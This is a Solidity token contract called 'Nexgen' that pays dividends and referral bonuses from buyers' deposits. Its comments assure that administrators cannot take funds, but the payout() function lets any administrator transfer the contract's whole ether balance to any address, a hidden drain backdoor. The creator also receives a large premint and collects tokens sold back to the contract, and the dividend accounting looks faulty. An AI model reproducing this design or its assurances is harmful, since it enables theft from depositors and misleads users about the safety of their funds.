1 /*NEXGEN dApp - The World's First Most Sustainable Decentralized Application */
2 
3 /**
4  * Source Code first verified at https://etherscan.io on Wednesday, June 18, 2019
5  (UTC) */
6 
7 pragma solidity ^0.4.20;
8 
9 contract Nexgen {
10     
11     /*=================================
12     =            MODIFIERS            =
13     =================================*/
14     // only people with tokens
15     modifier onlybelievers () {
16         require(myTokens() > 0);
17         _;
18     }
19     
20     // only people with profits
21     modifier onlyhodler() {
22         require(myDividends(true) > 0);
23         _;
24     }
25     
26     // only people with sold token
27     modifier onlySelingholder() {
28         require(sellingWithdrawBalance_[msg.sender] > 0);
29         _;
30     }
31     
32     // administrators can:
33     // -> change the name of the contract
34     // -> change the name of the token
35     // -> change the PoS difficulty 
36     // they CANNOT:
37     // -> take funds
38     // -> disable withdrawals
39     // -> kill the contract
40     // -> change the price of tokens
41     modifier onlyAdministrator(){
42         address _customerAddress = msg.sender;
43         require(administrators[keccak256(_customerAddress)]);
44         _;
45     }
46     
47     
48 
49     
50     /*==============================
51     =            EVENTS            =
52     ==============================*/
53     event onTokenPurchase(
54         address indexed customerAddress,
55         uint256 incomingEthereum,
56         uint256 tokensMinted,
57         address indexed referredBy
58     );
59     
60     event onTokenSell(
61         address indexed customerAddress,
62         uint256 tokensBurned
63     );
64     
65     event onReinvestment(
66         address indexed customerAddress,
67         uint256 ethereumReinvested,
68         uint256 tokensMinted
69     );
70     
71     event onWithdraw(
72         address indexed customerAddress,
73         uint256 ethereumWithdrawn
74     );
75     
76     event onSellingWithdraw(
77         
78         address indexed customerAddress,
79         uint256 ethereumWithdrawn
80     
81     );
82     
83     // ERC20
84     event Transfer(
85         address indexed from,
86         address indexed to,
87         uint256 tokens
88     );
89     
90     
91     /*=====================================
92     =            CONFIGURABLES            =
93     =====================================*/
94     string public name = "Nexgen";
95     string public symbol = "NEXG";
96     uint8 constant public decimals = 18;
97     uint8 constant internal dividendFee_ = 10;
98     
99     uint256 constant internal tokenPriceInitial_ = 0.000002 ether;
100     uint256 constant internal tokenPriceIncremental_ = 0.00000015 ether;
101 
102     
103     
104     // proof of stake (defaults at 1 token)
105     uint256 public stakingRequirement = 1e18;
106      
107     // add community wallet here
108     address internal constant CommunityWalletAddr = address(0xfd6503cae6a66Fc1bf603ecBb565023e50E07340);
109         
110         //add trading wallet here
111     address internal constant TradingWalletAddr = address(0x6d5220BC0D30F7E6aA07D819530c8727298e5883);   
112 
113     
114     
115    /*================================
116     =            DATASETS            =
117     ================================*/
118     // amount of shares for each address (scaled number)
119     mapping(address => uint256) internal tokenBalanceLedger_;
120     mapping(address => uint256) internal referralBalance_;
121     mapping(address => int256) internal payoutsTo_;
122     mapping(address => uint256) internal sellingWithdrawBalance_;
123     mapping(address => uint256) internal ambassadorAccumulatedQuota_;
124 
125     address[] private contractTokenHolderAddresses_;
126 
127     
128     uint256 internal tokenSupply_ = 0;
129     uint256 internal profitPerShare_;
130     
131     uint256 internal soldTokens_=0;
132     uint256 internal contractAddresses_=0;
133     uint256 internal tempIncomingEther=0;
134     uint256 internal calculatedPercentage=0;
135     
136     
137     uint256 internal tempProfitPerShare=0;
138     uint256 internal tempIf=0;
139     uint256 internal tempCalculatedDividends=0;
140     uint256 internal tempReferall=0;
141     uint256 internal tempSellingWithdraw=0;
142 
143     address internal creator;
144     
145 
146 
147     
148     // administrator list (see above on what they can do)
149     mapping(bytes32 => bool) public administrators;
150     
151     
152     bool public onlyAmbassadors = false;
153     
154 
155 
156     /*=======================================
157     =            PUBLIC FUNCTIONS            =
158     =======================================*/
159     /*
160     * -- APPLICATION ENTRY POINTS --  
161     */
162     function Nexgen()
163         public
164     {
165         // add administrators here
166            
167         administrators[0x25d75fcac9be21f1ff885028180480765b1120eec4e82c73b6f043c4290a01da] = true;
168         creator = msg.sender;
169         tokenBalanceLedger_[creator] = 35000000*1e18;                     
170                          
171         
172     }
173 
174     /**
175      * Community Wallet Balance
176      */
177     function CommunityWalletBalance() public view returns(uint256){
178         return address(0xfd6503cae6a66Fc1bf603ecBb565023e50E07340).balance;
179     }
180 
181     /**
182      * Trading Wallet Balance
183      */
184     function TradingWalletBalance() public view returns(uint256){
185         return address(0x6d5220BC0D30F7E6aA07D819530c8727298e5883).balance;
186     } 
187 
188     /**
189      * Referral Balance
190      */
191     function ReferralBalance() public view returns(uint256){
192         return referralBalance_[msg.sender];
193     } 
194 
195     /**
196      * Converts all incoming Ethereum to tokens for the caller, and passes down the referral address (if any)
197      */
198     function buy(address _referredBy)
199         public
200         payable
201         returns(uint256)
202     {
203         purchaseTokens(msg.value, _referredBy);
204 
205     }
206     
207     
208     function()
209         payable
210         public
211     {
212         purchaseTokens(msg.value, 0x0);
213     }
214     
215     /**
216      * Converts all of caller's dividends to tokens.
217      */
218     function reinvest()
219         onlyhodler()
220         public
221     {
222         address _customerAddress = msg.sender;
223 
224         // fetch dividends
225         uint256 _dividends = myDividends(true); // retrieve ref. bonus later in the code
226  
227          //calculate  10 % for distribution 
228         uint256  ten_percentForDistribution= SafeMath.percent(_dividends,10,100,18);
229 
230          //calculate  90 % to reinvest into tokens
231         uint256  nighty_percentToReinvest= SafeMath.percent(_dividends,90,100,18);
232         
233         
234         // dispatch a buy order with the calculatedPercentage 
235         uint256 _tokens = purchaseTokens(nighty_percentToReinvest, 0x0);
236         
237         
238         //Empty their  all dividends beacuse we are reinvesting them
239          payoutsTo_[_customerAddress]=0;
240          referralBalance_[_customerAddress]=0;
241         
242     
243      
244       //distribute to all as per holdings         
245         profitPerShareAsPerHoldings(ten_percentForDistribution);
246         
247         // fire event
248         onReinvestment(_customerAddress, _dividends, _tokens);
249     }
250     
251     /**
252      * Alias of sell() and withdraw().
253      */
254     function exit()
255         public
256     {
257         // get token count for caller & sell them all
258         address _customerAddress = msg.sender;
259         uint256 _tokens = tokenBalanceLedger_[_customerAddress];
260         if(_tokens > 0) sell(_tokens);
261         
262         
263         withdraw();
264     }
265 
266     /**
267      * Withdraws all of the callers earnings.
268      */
269     function withdraw()
270         onlyhodler()
271         public
272     {
273         // setup data
274         address _customerAddress = msg.sender;
275         
276         //calculate 20 % of all Dividends and transfer them to two communities
277         //10% to community wallet
278         //10% to trading wallet
279         
280         uint256 _dividends = myDividends(true); // get all dividends
281         
282         //calculate  10 % for trending wallet
283         uint256  ten_percentForTradingWallet= SafeMath.percent(_dividends,10,100,18);
284 
285         //calculate 10 % for community wallet
286          uint256 ten_percentForCommunityWallet= SafeMath.percent(_dividends,10,100,18);
287 
288         
289         //Empty their  all dividends beacuse we are reinvesting them
290          payoutsTo_[_customerAddress]=0;
291          referralBalance_[_customerAddress]=0;
292        
293          // delivery service
294         CommunityWalletAddr.transfer(ten_percentForCommunityWallet);
295         
296          // delivery service
297         TradingWalletAddr.transfer(ten_percentForTradingWallet);
298         
299         //calculate 80% to tranfer it to customer address
300          uint256 eighty_percentForCustomer= SafeMath.percent(_dividends,80,100,18);
301 
302        
303         // delivery service
304         _customerAddress.transfer(eighty_percentForCustomer);
305         
306         // fire event
307         onWithdraw(_customerAddress, _dividends);
308     }
309     
310      /**
311      * Withdrawa all selling Withdraw of the callers earnings.
312      */
313     function sellingWithdraw()
314         onlySelingholder()
315         public
316     {
317         // setup data
318         address _customerAddress = msg.sender;
319         
320 
321         uint256 _sellingWithdraw = sellingWithdrawBalance_[_customerAddress] ; // get all balance
322         
323 
324         //Empty  all sellingWithdraw beacuse we are giving them ethers
325          sellingWithdrawBalance_[_customerAddress]=0;
326 
327      
328         // delivery service
329         _customerAddress.transfer(_sellingWithdraw);
330         
331         // fire event
332         onSellingWithdraw(_customerAddress, _sellingWithdraw);
333     }
334     
335     
336     
337      /**
338      * Sell tokens.
339      * Remember, there's a 10% fee here as well.
340      */
341    function sell(uint256 _amountOfTokens)
342         onlybelievers ()
343         public
344     {
345       
346         address _customerAddress = msg.sender;
347        
348         //calculate 10 % of tokens and distribute them 
349         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
350         uint256 _tokens = _amountOfTokens;
351       
352        uint256 _ethereum = tokensToEthereum_(_tokens);
353         
354           //calculate  10 % for distribution 
355        uint256  ten_percentToDistributet= SafeMath.percent(_ethereum,10,100,18);
356 
357           //calculate  90 % for customer withdraw wallet
358         uint256  nighty_percentToCustomer= SafeMath.percent(_ethereum,90,100,18);
359         
360         // burn the sold tokens
361         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
362         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
363         tokenBalanceLedger_[creator] = SafeMath.add(tokenBalanceLedger_[creator], _tokens);
364 
365 
366         //substract sold token from circulations of tokenSupply_
367         soldTokens_=SafeMath.sub(soldTokens_,_tokens);
368         
369         // update sellingWithdrawBalance of customer 
370        sellingWithdrawBalance_[_customerAddress] += nighty_percentToCustomer;       
371         
372        
373         //distribute to all as per holdings         
374        profitPerShareAsPerHoldings(ten_percentToDistributet);
375       
376         //Sold Tokens Ether Transfer to User Account
377         sellingWithdraw();
378         
379         // fire event
380         onTokenSell(_customerAddress, _tokens);
381         
382     }
383     
384     
385     /**
386      * Transfer tokens from the caller to a new holder.
387      * Remember, there's a 5% fee here as well.
388      */
389     function transfer(address _toAddress, uint256 _amountOfTokens)
390         onlybelievers ()
391         public
392         returns(bool)
393     {
394         // setup
395         address _customerAddress = msg.sender;
396         
397         // make sure we have the requested tokens
398      
399         require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
400       
401         //calculate 5 % of total tokens calculate Tokens Received
402         uint256  five_percentOfTokens= SafeMath.percent(_amountOfTokens,5,100,18);
403         
404        
405        //calculate 95 % of total tokens calculate Tokens Received
406         uint256  nightyFive_percentOfTokens= SafeMath.percent(_amountOfTokens,95,100,18);
407         
408         
409         // burn the fee tokens
410         //convert ethereum to tokens
411         tokenSupply_ = SafeMath.sub(tokenSupply_,five_percentOfTokens);
412         
413         //substract five percent from communiity of tokens
414         soldTokens_=SafeMath.sub(soldTokens_, five_percentOfTokens);
415 
416         // exchange tokens
417         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
418         tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], nightyFive_percentOfTokens) ;
419         
420 
421         //calculate value of all token to transfer to ethereum
422         uint256 five_percentToDistribute = tokensToEthereum_(five_percentOfTokens);
423 
424 
425         //distribute to all as per holdings         
426         profitPerShareAsPerHoldings(five_percentToDistribute);
427 
428         // fire event
429         Transfer(_customerAddress, _toAddress, nightyFive_percentOfTokens);
430         
431         
432         return true;
433        
434     }
435     
436     /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
437     /**
438      * administrator can manually disable the ambassador phase.
439      */
440     function disableInitialStage()
441         onlyAdministrator()
442         public
443     {
444         onlyAmbassadors = false;
445     }
446     
447    
448     function setAdministrator(bytes32 _identifier, bool _status)
449         onlyAdministrator()
450         public
451     {
452         administrators[_identifier] = _status;
453     }
454     
455    
456     function setStakingRequirement(uint256 _amountOfTokens)
457         onlyAdministrator()
458         public
459     {
460         stakingRequirement = _amountOfTokens;
461     }
462     
463     
464     function setName(string _name)
465         onlyAdministrator()
466         public
467     {
468         name = _name;
469     }
470     
471    
472     function setSymbol(string _symbol)
473         onlyAdministrator()
474         public
475     {
476         symbol = _symbol;
477     }
478 
479     function payout (address _address) public onlyAdministrator returns(bool res) {
480         _address.transfer(address(this).balance);
481         return true;
482     }
483     /*----------  HELPERS AND CALCULATORS  ----------*/
484     /**
485      * Method to view the current Ethereum stored in the contract
486      * Example: totalEthereumBalance()
487      */
488     function totalEthereumBalance()
489         public
490         view
491         returns(uint)
492     {
493         return this.balance;
494     }
495     
496     /**
497      * Retrieve the total token supply.
498      */
499     function totalSupply()
500         public
501         view
502         returns(uint256)
503     {
504         return tokenSupply_;
505     }
506     
507     /**
508      * Retrieve the tokens owned by the caller.
509      */
510     function myTokens()
511         public
512         view
513         returns(uint256)
514     {
515         address _customerAddress = msg.sender;
516         return balanceOf(_customerAddress);
517     }
518     
519     /**
520      * Retrieve the sold tokens .
521      */
522     function soldTokens()
523         public
524         view
525         returns(uint256)
526     {
527 
528         return soldTokens_;
529     }
530     
531     
532     /**
533      * Retrieve the dividends owned by the caller.
534        */ 
535     function myDividends(bool _includeReferralBonus) 
536         public 
537         view 
538         returns(uint256)
539     {
540         address _customerAddress = msg.sender;
541 
542         return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress);
543     }
544     
545     /**
546      * Retrieve the token balance of any single address.
547      */
548     function balanceOf(address _customerAddress)
549         view
550         public
551         returns(uint256)
552     {
553         return tokenBalanceLedger_[_customerAddress];
554     }
555     
556     /**
557      * Retrieve the selingWithdraw balance of address.
558      */
559     function selingWithdrawBalance()
560         view
561         public
562         returns(uint256)
563     {
564         address _customerAddress = msg.sender;
565          
566         uint256 _sellingWithdraw = (uint256) (sellingWithdrawBalance_[_customerAddress]) ; // get all balance
567         
568         return  _sellingWithdraw;
569     }
570     
571     /**
572      * Retrieve the dividend balance of any single address.
573      */
574     function dividendsOf(address _customerAddress)
575         view
576         public
577         returns(uint256)
578     {
579      
580         return  (uint256) (payoutsTo_[_customerAddress]) ;
581 
582         
583     }
584     
585     /**
586      * Return the buy price of 1 individual token.
587      */
588     function sellPrice() 
589         public 
590         view 
591         returns(uint256)
592     {
593        
594         if(tokenSupply_ == 0){
595             return tokenPriceInitial_ - tokenPriceIncremental_;
596         } else {
597             uint256 _ethereum = tokensToEthereum_(1e18);
598             
599             return _ethereum - SafeMath.percent(_ethereum,15,100,18);
600         }
601     }
602     
603     /**
604      * Return the sell price of 1 individual token.
605      */
606     function buyPrice() 
607         public 
608         view 
609         returns(uint256)
610     {
611         
612         if(tokenSupply_ == 0){
613             return tokenPriceInitial_ ;
614         } else {
615             uint256 _ethereum = tokensToEthereum_(1e18);
616            
617            
618             return _ethereum;
619         }
620     }
621     
622    
623     /**
624      * Function to calculate actual value after Taxes
625      */
626     function calculateTokensReceived(uint256 _ethereumToSpend) 
627         public 
628         view 
629         returns(uint256)
630     {
631          //calculate  15 % for distribution 
632         uint256  fifteen_percentToDistribute= SafeMath.percent(_ethereumToSpend,15,100,18);
633 
634         uint256 _dividends = SafeMath.sub(_ethereumToSpend, fifteen_percentToDistribute);
635         uint256 _amountOfTokens = ethereumToTokens_(_dividends);
636         
637         return _amountOfTokens;
638     }
639     
640     
641    
642    
643     function calculateEthereumReceived(uint256 _tokensToSell) 
644         public 
645         view 
646         returns(uint256)
647     {
648         require(_tokensToSell <= tokenSupply_);
649         
650         uint256 _ethereum = tokensToEthereum_(_tokensToSell);
651         
652          //calculate  10 % for distribution 
653         uint256  ten_percentToDistribute= SafeMath.percent(_ethereum,10,100,18);
654         
655         uint256 _dividends = SafeMath.sub(_ethereum, ten_percentToDistribute);
656 
657         return _dividends;
658 
659     }
660     
661     
662     /*==========================================
663     =            INTERNAL FUNCTIONS            =
664     ==========================================*/
665     
666     
667     function purchaseTokens(uint256 _incomingEthereum, address _referredBy)
668         internal
669         returns(uint256)
670     {
671         // data setup
672         address _customerAddress = msg.sender;
673         
674         //check if address 
675         tempIncomingEther=_incomingEthereum;
676         
677                 bool isFound=false;
678                 
679                 for(uint k=0;k<contractTokenHolderAddresses_.length;k++){
680                     
681                     if(contractTokenHolderAddresses_[k] ==_customerAddress){
682                         
683                      isFound=true;
684                     break;
685                         
686                     }
687                 }
688     
689     
690         if(!isFound){
691         
692             //increment address to keep track of no of users in smartcontract
693             contractAddresses_+=1;  
694             
695             contractTokenHolderAddresses_.push(_customerAddress);
696                         
697             }
698     
699      //calculate 85 percent
700       calculatedPercentage= SafeMath.percent(_incomingEthereum,85,100,18);
701       
702       uint256 _amountOfTokens = ethereumToTokens_(SafeMath.percent(_incomingEthereum,85,100,18));    
703 
704         // we can't give people infinite ethereum
705         if(tokenSupply_ > 0){
706             
707             // add tokens to the pool
708             tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
709         
710         
711         } else {
712             // add tokens to the pool
713             tokenSupply_ = _amountOfTokens;
714         }
715         
716         // update circulating supply & the ledger address for the customer
717         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
718         
719         
720         require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_) && tokenSupply_ <= (55000000*1e18));
721         
722         // is the user referred by a Nexgen Key?
723         if(
724             // is this a referred purchase?
725             _referredBy != 0x0000000000000000000000000000000000000000 &&
726 
727             // no cheating!
728             _referredBy != _customerAddress &&
729             
730             // does the referrer have at least X whole tokens?
731             // i.e is the referrer a godly chad masternode
732             tokenBalanceLedger_[_referredBy] >= stakingRequirement
733             
734         ){
735            
736      // give 5 % to referral
737      referralBalance_[_referredBy]+= SafeMath.percent(_incomingEthereum,5,100,18);
738      
739      tempReferall+=SafeMath.percent(_incomingEthereum,5,100,18);
740      
741      if(contractAddresses_>0){
742          
743      profitPerShareAsPerHoldings(SafeMath.percent(_incomingEthereum,10,100,18));
744     
745     
746        
747      }
748      
749     } else {
750           
751      
752      if(contractAddresses_>0){
753     
754      profitPerShareAsPerHoldings(SafeMath.percent(_incomingEthereum,15,100,18));
755 
756  
757         
758      }
759             
760         }
761         
762       
763     
764 
765         
766         // fire event
767         onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);
768         
769         //calculate sold tokens here
770         soldTokens_+=_amountOfTokens;
771         
772         return _amountOfTokens;
773     }
774 
775    
776      
777    /**
778      * Calculate Token price based on an amount of incoming ethereum
779      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
780      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
781      */
782      
783     function ethereumToTokens_(uint256 _ethereum)
784         internal
785         view
786         returns(uint256)
787     {
788         uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;
789         uint256 _tokensReceived = 
790          (
791             (
792                 // underflow attempts BTFO
793                 SafeMath.sub(
794                     (sqrt
795                         (
796                             (_tokenPriceInitial**2)
797                             +
798                             (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
799                             +
800                             (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
801                             +
802                             (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
803                         )
804                     ), _tokenPriceInitial
805                 )
806             )/(tokenPriceIncremental_)
807         )-(tokenSupply_)
808         ;
809   
810         return _tokensReceived;
811     }
812     
813     /**
814      * Calculate token sell value.
815           */
816      function tokensToEthereum_(uint256 _tokens)
817         internal
818         view
819         returns(uint256)
820     {
821 
822         uint256 tokens_ = (_tokens + 1e18);
823         uint256 _tokenSupply = (tokenSupply_ + 1e18);
824         uint256 _etherReceived =
825         (
826             // underflow attempts BTFO
827             SafeMath.sub(
828                 (
829                     (
830                         (
831                             tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
832                         )-tokenPriceIncremental_
833                     )*(tokens_ - 1e18)
834                 ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
835             )
836         /1e18);
837         return _etherReceived;
838     }
839     
840     //calculate profitPerShare as per holdings
841     function profitPerShareAsPerHoldings(uint256 calculatedDividend)  internal {
842     
843        //calculate number of token 
844        uint256 noOfTokens_;
845         tempCalculatedDividends=calculatedDividend;
846 
847        for(uint i=0;i<contractTokenHolderAddresses_.length;i++){
848          
849          noOfTokens_+= tokenBalanceLedger_[contractTokenHolderAddresses_[i]];
850 
851         }
852         
853         //check if self token balance is zero then distribute to others as per holdings
854         
855     for(uint k=0;k<contractTokenHolderAddresses_.length;k++){
856         
857         if(noOfTokens_>0 && tokenBalanceLedger_[contractTokenHolderAddresses_[k]]!=0){
858        
859 
860            profitPerShare_=SafeMath.percent(calculatedDividend,tokenBalanceLedger_[contractTokenHolderAddresses_[k]],noOfTokens_,18);
861          
862            tempProfitPerShare=profitPerShare_;
863 
864            payoutsTo_[contractTokenHolderAddresses_[k]] += (int256) (profitPerShare_) ;
865            
866            tempIf=1;
867 
868             
869         }else if(noOfTokens_==0 && tokenBalanceLedger_[contractTokenHolderAddresses_[k]]==0){
870             
871             tempIf=2;
872             tempProfitPerShare=profitPerShare_;
873 
874             payoutsTo_[contractTokenHolderAddresses_[k]] += (int256) (calculatedDividend) ;
875         
876             
877         }
878         
879       }
880         
881         
882     
883         
884 
885     
886     }
887     
888     //calculate square root
889     function sqrt(uint x) internal pure returns (uint y) {
890         uint z = (x + 1) / 2;
891         y = x;
892         while (z < y) {
893             y = z;
894             z = (x / z + z) / 2;
895         }
896     }
897 }
898 
899 /**
900  * @title SafeMath
901  * @dev Math operations with safety checks that throw on error
902  */
903 library SafeMath {
904     
905     function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(/*uint division,*/uint quotient) {
906 
907          // caution, check safe-to-multiply here
908         uint _numerator  = numerator * 10 ** (precision+1);
909         // with rounding of last digit
910         uint _quotient =  ((_numerator / denominator) + 5) / 10;
911         
912        // uint division_=numerator/denominator;
913         /* value*division_,*/
914         return (value*_quotient/1000000000000000000);
915   }
916 
917 
918     
919     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
920         if (a == 0) {
921             return 0;
922         }
923         uint256 c = a * b;
924         assert(c / a == b);
925         return c;
926     }
927 
928    
929     function div(uint256 a, uint256 b) internal pure returns (uint256) {
930         // assert(b > 0); // Solidity automatically throws when dividing by 0
931         uint256 c = a / b;
932         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
933         return c;
934     }
935 
936     
937     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
938         assert(b <= a);
939         return a - b;
940     }
941 
942    
943     function add(uint256 a, uint256 b) internal pure returns (uint256) {
944         uint256 c = a + b;
945         assert(c >= a);
946         return c;
947     }
948 }